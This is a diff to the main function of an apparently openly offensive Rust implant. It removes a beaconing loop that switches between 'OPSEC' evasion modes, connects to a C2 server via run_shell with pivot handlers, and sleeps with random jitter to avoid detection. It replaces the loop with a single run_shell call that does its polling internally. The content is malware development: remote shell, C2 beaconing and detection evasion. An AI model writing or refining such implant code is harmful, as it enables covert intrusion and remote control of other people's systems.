@@ -98,46 +98,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[INFO] Using embedded configuration");
 
     info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
-    loop {
-        let new_mode = determine_agent_mode();
-        {
-            let mut state = OPSEC_STATE.lock().unwrap();
-            if state.mode != new_mode {
-                info!("[OPSEC] Mode transition: {:?} -> {:?}", state.mode, new_mode);
-                state.mode = new_mode;
-                state.last_transition = std::time::Instant::now();
-                on_mode_transition(new_mode);
-            } else {
-                debug!("[OPSEC] Mode unchanged: {:?}", state.mode);
-            }
-        }
 
-        match new_mode {
-            AgentMode::FullOpsec => {
-                // Minimize activity: long sleep, no heavy ops, delay tasks
-                log::debug!("[OPSEC] Full OPSEC: minimizing activity.");
-                // e.g. skip non-urgent commands, rate limit
-            }
-            AgentMode::BackgroundOpsec => {
-                // Higher beaconing, process queued commands, allow heavier ops
-                log::debug!("[OPSEC] Background OPSEC: can process queued tasks.");
-            }
-        }
-
-        info!("[NETWORK] Attempting connection to C2: {}", server_addr);
-        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
-            error!("[ERROR] Shell error: {}. Retrying...", e);
-            time::sleep(Duration::from_secs(5)).await;
-        }
-        
-        let (base, jitter) = match new_mode {
-            AgentMode::FullOpsec => (900, 1800),         // 15–45 min
-            AgentMode::BackgroundOpsec => (120, 180),     // 2–5 min
-        };
-        let sleep_time = random_jitter(base, jitter);
-        info!("[OPSEC] Sleeping for {} seconds (mode: {:?})", sleep_time, new_mode);
-        tokio::time::sleep(std::time::Duration::from_secs(sleep_time)).await;
+    // Only call run_shell ONCE; all polling/sleeping is handled inside run_shell
+    if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
+        error!("[ERROR] Shell error: {}. Exiting...", e);
     }
+
+    Ok(())
 }
 
 fn on_mode_transition(new_mode: AgentMode) {
